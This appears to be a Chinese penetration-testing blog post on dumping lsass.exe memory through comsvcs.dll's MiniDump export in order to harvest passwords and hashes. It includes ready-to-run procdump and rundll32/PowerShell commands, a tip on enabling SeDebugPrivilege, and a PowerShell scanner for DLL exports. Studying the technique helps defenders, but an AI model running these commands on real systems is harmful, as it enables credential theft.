---
layout: post
title: 《MiniDumpWriteDump via COM+ Services DLL》的利用测试
---


## 0x00 前言
---

最近学习了odzhan文章中介绍的一个技巧，使用C:\windows\system32\comsvcs.dll的导出函数MiniDump能够dump指定进程的内存文件。

文章地址：

https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/

本文将要结合自己的经验，补充在测试过程中需要注意的地方，扩展方法，分析利用思路。编写powershell脚本，实现自动化扫描系统目录下所有dll的导出函数，查看是否存在其他可用的dll，介绍脚本实现的细节。

## 0x01 简介
---

本文将要介绍以下内容：

- dump指定进程内存文件的常用方法
- 使用comsvcs.dll实现dump指定进程内存文件的方法
- 编写脚本实现自动化扫描dll的导出函数
- 利用分析

## 0x02 dump指定进程内存文件的常用方法
---

在渗透测试中，最常用的方法是通过dump进程lsass.exe，从中获得明文口令和hash

在原理上都是使用API MiniDumpWriteDump，参考资料：

https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump

常用的实现方法如下：

### 1.procdump

参数如下：

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### 2.c++实现

https://github.com/killswitch-GUI/minidump-lib

### 3.powershell实现

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1

### 4.c#实现

https://github.com/GhostPack/SharpDump

## 0x03 使用comsvcs.dll实现dump指定进程内存文件的方法
---

odzhan在文中给出了三种方法

### 1.通过rundll32

示例参数如下：

```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full
```

示例中lsass.exe的pid为808

**注：**

此处需要注意权限的问题，在dump指定进程内存文件时，需要开启SeDebugPrivilege权限

管理员权限的cmd下，默认支持SeDebugPrivilege权限，但是状态为Disabled，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-2/2-1.png)

所以说，直接在cmd下执行rundll32的命令尝试dump指定进程内存文件时，由于无法开启SeDebugPrivilege权限，所以会失败

这里给出我的一个解决方法：

管理员权限的powershell下，默认支持SeDebugPrivilege权限，并且状态为Enabled，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-2/2-2.png)

所以，这里可以通过powershell执行rundll32的命令实现，示例命令如下：

```
powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full"
```

### 2.通过vbs实现

原文提供了完整的实现代码

执行的参数如下：

```
cscript 1.vbs lsass.exe
```

vbs脚本首先开启SeDebugPrivilege权限，接着执行rundll32的命令，测试成功

### 3.通过c实现

原文提供了完整的实现代码

代码先开启SeDebugPrivilege权限，再调用comsvcs.dll的导出函数MiniDumpW，测试成功

## 0x04 编写脚本实现自动化扫描dll的导出函数
---

学习完odzhan的文章以后，我产生了一个疑问：

Windows系统目录下是否存在其他可用的dll？

于是，我尝试通过脚本对系统目录下所有dll的导出函数进行筛选，查看是否包含导出函数MiniDumpW

脚本实现上需要考虑以下两个问题：

### 1.遍历指定目录，获取所有dll

遍历路径C:\windows的测试代码如下：

```
ForEach($file in (Get-ChildItem -recurse -Filter "*.dll" -Path 'C:\windows'  -ErrorAction SilentlyContinue )) 
{
    $file.PSPath
}
```

由于存在多级目录，这里需要获得dll的绝对路径，而$file.PSPath的格式为`Microsoft.PowerShell.Core\FileSystem::C:\windows\RtlExUpd.dll`，实际路径需要去除前缀

优化后的代码如下：

```
ForEach($file in (Get-ChildItem -recurse -Filter "*.dll" -Path 'C:\windows'  -ErrorAction SilentlyContinue )) 
{
    $file.PSPath.Substring($file.PSPath.IndexOf(":")+2)
}
```

### 2.获得指定dll的导出函数

这里可以参考https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1

在此基础上进行优化，实现整个流程的自动化处理

完整代码已上传至GitHub，地址如下：

https://github.com/3gstudent/Homework-of-Powershell/blob/master/Get-AllExports.ps1

对C:\Windows进行筛选的代码如下：

```
Import-Module ./Get-AllExports.ps1
$Path = 'C:\Windows'
ForEach($file in (Get-ChildItem -recurse -Filter "*.dll" -Path $Path  -ErrorAction SilentlyContinue )) 
{
#   $file.PSPath.Substring($file.PSPath.IndexOf(":")+2)
    Get-Exports -DllPath $file.PSPath.Substring($file.PSPath.IndexOf(":")+2)
}
```

测试系统：Win7x64

部分结果：

```
[+] C:\windows\system32\comsvcs.dll-->MiniDumpW
[+] C:\windows\system32\dbghelp.dll-->MiniDumpReadDumpStream
[+] C:\windows\system32\dbghelp.dll-->MiniDumpWriteDump
[+] C:\Windows\Syswow64\comsvcs.dll-->MiniDumpW
[+] C:\Windows\Syswow64\dbghelp.dll-->MiniDumpReadDumpStream
[+] C:\Windows\Syswow64\dbghelp.dll-->MiniDumpWriteDump
[+] C:\Windows\Microsoft.NET\Framework\v2.0.50727\SOS.dll-->MinidumpMode
[+] C:\Windows\Microsoft.NET\Framework\v2.0.50727\SOS.dll-->Minidumpmode
[+] C:\Windows\Microsoft.NET\Framework\v2.0.50727\SOS.dll-->minidumpmode
[+] C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll-->MinidumpMode
[+] C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll-->Minidumpmode
[+] C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll-->minidumpmode
[+] C:\Windows\Microsoft.NET\Framework64\v2.0.50727\SOS.dll-->MinidumpMode
[+] C:\Windows\Microsoft.NET\Framework64\v2.0.50727\SOS.dll-->Minidumpmode
[+] C:\Windows\Microsoft.NET\Framework64\v2.0.50727\SOS.dll-->minidumpmode
[+] C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SOS.dll-->MinidumpMode
[+] C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SOS.dll-->Minidumpmode
[+] C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SOS.dll-->minidumpmode
[+] C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll-->MiniDumpW
[+] C:\Windows\winsxs\amd64_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_a6821d2940c2bcdc\dbghelp.dll-->MiniDumpReadDumpStream
[+] C:\Windows\winsxs\amd64_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_a6821d2940c2bcdc\dbghelp.dll-->MiniDumpWriteDump
[+] C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll-->MiniDumpW
[+] C:\Windows\winsxs\x86_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_4a6381a588654ba6\dbghelp.dll-->MiniDumpReadDumpStream
[+] C:\Windows\winsxs\x86_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_4a6381a588654ba6\dbghelp.dll-->MiniDumpWriteDump
```

测试结果如下：

#### 1.对于不同结构的进程，可用的dll不同

对于32位的进程，可以使用32位和64位的dll：

- C:\windows\system32\comsvcs.dll
- C:\Windows\Syswow64\comsvcs.dll
- C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll
- C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll

对于64位的进程，可以使用64位的dll：

- C:\windows\system32\comsvcs.dll
- C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll

无法使用32位的dll：

- C:\Windows\Syswow64\comsvcs.dll
- C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll

#### 2.dbghelp.dll对应API MiniDumpWriteDump

#### 3.SOS.dll中的导出函数minidumpmode

用于防止在使用minidump时执行非安全命令。0表示禁用这个功能，1表示启用。默认为0

## 0x05 利用分析
---

如果想要dump指定进程的内存文件，可以使用新的方法，示例命令如下：

```
powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full"
```

其中comsvcs.dll可以替换为以下dll：

- C:\Windows\Syswow64\comsvcs.dll
- C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll
- C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll

这种方法的优点是不需要上传文件，使用系统默认包含的dll就可以实现

## 0x06 小结
---

本文在odzhan文章的基础上，补充在测试过程中需要注意的地方，扩展方法，分析利用思路。编写powershell脚本，实现自动化扫描系统目录下所有dll的导出函数。



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

